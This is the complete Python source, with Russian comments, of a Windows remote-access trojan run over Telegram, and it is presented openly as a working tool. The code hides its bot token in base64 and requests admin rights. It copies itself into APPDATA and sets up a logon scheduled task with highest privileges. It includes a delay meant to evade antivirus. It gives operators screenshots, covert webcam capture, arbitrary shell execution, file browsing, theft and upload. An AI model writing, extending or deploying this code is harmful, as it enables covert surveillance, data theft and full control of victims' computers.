import os
import sys
import time
import base64
import ctypes
import subprocess
import platform
import socket
import string
import math
import shutil
import logging

# --- КРИТИЧНО: Определяем реальный путь ДО импортов тяжелых библиотек ---
if getattr(sys, 'frozen', False):
    # Nuitka onefile: ищем реальный EXE, а не временную папку
    if hasattr(sys, '_MEIPASS'):
        # PyInstaller
        REAL_EXE = sys.executable
    else:
        # Nuitka: sys.executable указывает на правильный EXE
        REAL_EXE = sys.executable
else:
    REAL_EXE = os.path.abspath(__file__)

# Теперь импортируем остальное
import cv2
import numpy as np
import pyautogui
from PIL import Image
from io import BytesIO
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters

# --- КОНФИГУРАЦИЯ ---
B64_TOKEN = "Njg0MjYwMTEwNTpBQUdPQTY4bWVBM2tDLXBQaE12bDhBeFMybS1qRjhINmtkNA=="
AUTHORIZED_USERS = [2130144673, 2085708753]
APP_NAME = "SystemControlBot"
SINGLE_INSTANCE_PORT = 65432
ITEMS_PER_PAGE = 10

logging.basicConfig(level=logging.CRITICAL)

def d(s):
    return base64.b64decode(s).decode('utf-8')

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def restart_as_admin():
    try:
        ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", REAL_EXE, "", None, 1)
        return int(ret) > 32
    except: return False

def check_single_instance():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('127.0.0.1', SINGLE_INSTANCE_PORT))
        return s
    except: return None

def install_and_restart():
    if platform.system() != "Windows": return
    
    dest_dir = os.path.join(os.getenv('APPDATA'), APP_NAME)
    dest = os.path.join(dest_dir, os.path.basename(REAL_EXE))

    # Проверяем, мы уже в AppData?
    if REAL_EXE.lower() == dest.lower(): return
    
    # Проверяем, не запущены ли мы из Temp (Nuitka onefile)
    if "Temp" in REAL_EXE and "onefile" in REAL_EXE:
        return  # Не копируем из временной папки

    try:
        os.makedirs(dest_dir, exist_ok=True)
        shutil.copy2(REAL_EXE, dest)
        
        run = f'"{dest}"'
        subprocess.run(f'schtasks /Create /TN "{APP_NAME}" /TR {run} /SC ONLOGON /RL HIGHEST /F', shell=True, capture_output=True)
        subprocess.Popen(run, shell=True)
        sys.exit(0)
    except: pass

def take_screenshot():
    try:
        img = pyautogui.screenshot()
        buf = BytesIO()
        img.save(buf, format='JPEG', quality=85)
        buf.seek(0)
        return buf, None
    except Exception as e: return None, str(e)

def capture_camera():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return None, "Camera busy"
        for _ in range(5): cap.read()
        ret, frame = cap.read()
        cap.release()
        if ret:
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame)
            buf = BytesIO()
            img.save(buf, format='JPEG', quality=85)
            buf.seek(0)
            return buf, None
        return None, "No frame"
    except Exception as e: return None, str(e)

def get_drives():
    return [f"{c}:\\" for c in string.ascii_uppercase if os.path.exists(f"{c}:\\")]

def build_keyboard(path, page=0):
    kb = []
    items = []
    
    if path == "root":
        items = [{"n": dr, "t": "d", "p": dr} for dr in get_drives()]
        txt = "📂 Диски:"
    else:
        try:
            if not os.path.exists(path): return None, "❌ Нет"
            raw = os.listdir(path)
            dirs = [{"n": n, "t": "d", "p": os.path.join(path, n)} for n in raw if os.path.isdir(os.path.join(path, n))]
            files = [{"n": n, "t": "f", "p": os.path.join(path, n)} for n in raw if os.path.isfile(os.path.join(path, n))]
            dirs.sort(key=lambda x: x['n'].lower())
            files.sort(key=lambda x: x['n'].lower())
            items = dirs + files
            txt = f"📂 `{path}`"
        except: return None, "🚫 Нет доступа"

    total = len(items)
    pages = math.ceil(total / ITEMS_PER_PAGE)
    if page >= pages: page = pages - 1
    if page < 0: page = 0
    
    chunk = items[page * ITEMS_PER_PAGE:(page + 1) * ITEMS_PER_PAGE]

    if path != "root":
        parent = os.path.dirname(path.rstrip("\\"))
        bp = f"0|root" if len(path) <= 3 else f"0|{parent}"
        kb.append([InlineKeyboardButton("⬆️", callback_data=f"n:{bp}")])

    for i in chunk:
        if i['t'] == 'd':
            cb = f"n:0|{i['p']}"
            bt = f"📁 {i['n']}"
        else:
            cb = f"d:{i['p']}"
            bt = f"📄 {i['n']}"
        if len(cb.encode()) < 64:
            kb.append([InlineKeyboardButton(bt, callback_data=cb)])

    nav = []
    if page > 0: nav.append(InlineKeyboardButton("◀️", callback_data=f"n:{page-1}|{path}"))
    nav.append(InlineKeyboardButton(f"{page+1}/{max(1,pages)}", callback_data="x"))
    if page < pages - 1: nav.append(InlineKeyboardButton("▶️", callback_data=f"n:{page+1}|{path}"))
    kb.append(nav)

    return InlineKeyboardMarkup(kb), txt

async def cmd_start(u, c):
    if u.message.from_user.id not in AUTHORIZED_USERS: return
    await u.message.reply_text("✅ Online\n/screen /cam /exec /download /files")

async def cmd_screen(u, c):
    if u.message.from_user.id not in AUTHORIZED_USERS: return
    await u.message.reply_chat_action("upload_photo")
    p, e = take_screenshot()
    if p: await u.message.reply_photo(p)
    else: await u.message.reply_text(f"❌ {e}")

async def cmd_cam(u, c):
    if u.message.from_user.id not in AUTHORIZED_USERS: return
    await u.message.reply_chat_action("upload_photo")
    p, e = capture_camera()
    if p: await u.message.reply_photo(p)
    else: await u.message.reply_text(f"❌ {e}")

async def cmd_exec(u, c):
    if u.message.from_user.id not in AUTHORIZED_USERS: return
    cmd = " ".join(c.args)
    if not cmd: return
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30, encoding='cp866', errors='ignore')
        o = (r.stdout + r.stderr)[:4000] or "OK"
        await u.message.reply_text(f"```\n{o}\n```", parse_mode="Markdown")
    except Exception as e: await u.message.reply_text(str(e))

async def cmd_download(u, c):
    if u.message.from_user.id not in AUTHORIZED_USERS: return
    p = " ".join(c.args)
    if p and os.path.isfile(p):
        await u.message.reply_document(document=open(p, 'rb'))

async def cmd_files(u, c):
    if u.message.from_user.id not in AUTHORIZED_USERS: return
    kb, t = build_keyboard("root", 0)
    if kb: await u.message.reply_text(t, reply_markup=kb, parse_mode="Markdown")

async def on_button(u, c):
    q = u.callback_query
    if q.from_user.id not in AUTHORIZED_USERS: return await q.answer()
    await q.answer()
    data = q.data
    if data == "x": return
    
    try: act, payload = data.split(":", 1)
    except: return

    if act == "n":
        try: pg, pth = payload.split("|", 1)
        except: return
        kb, t = build_keyboard(pth, int(pg))
        if kb:
            try: await q.edit_message_text(t, reply_markup=kb, parse_mode="Markdown")
            except: pass
    elif act == "d":
        try: await c.bot.send_document(q.from_user.id, document=open(payload, 'rb'))
        except: pass

async def on_file(u, c):
    if u.message.from_user.id not in AUTHORIZED_USERS: return
    if u.message.document:
        f = await u.message.document.get_file()
        name = u.message.document.file_name
    elif u.message.photo:
        f = await u.message.photo[-1].get_file()
        name = f"photo_{int(time.time())}.jpg"
    else: return

    desk = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    cap = u.message.caption
    if cap and os.path.isdir(cap): save = cap
    else: save = desk
    
    path = os.path.join(save, name)
    try:
        await f.download_to_drive(path)
        await u.message.reply_text("✅")
    except Exception as e: await u.message.reply_text(f"❌ {e}")

async def on_start(app):
    for uid in AUTHORIZED_USERS:
        try: await app.bot.send_message(uid, "🟢")
        except: pass

def main():
    # Задержка для антивирусов
    time.sleep(2)
    
    # Запрос админа
    if not is_admin():
        if restart_as_admin(): sys.exit(0)

    # Установка
    install_and_restart()
    
    # Проверка дублей
    sock = check_single_instance()
    if not sock: sys.exit(0)

    # Запуск
    token = d(B64_TOKEN)
    app = Application.builder().token(token).post_init(on_start).build()
    
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("screen", cmd_screen))
    app.add_handler(CommandHandler("cam", cmd_cam))
    app.add_handler(CommandHandler("exec", cmd_exec))
    app.add_handler(CommandHandler("download", cmd_download))
    app.add_handler(CommandHandler("files", cmd_files))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_handler(MessageHandler(filters.Document.ALL | filters.PHOTO, on_file))
    
    app.run_polling()

if __name__ == "__main__":
    main()
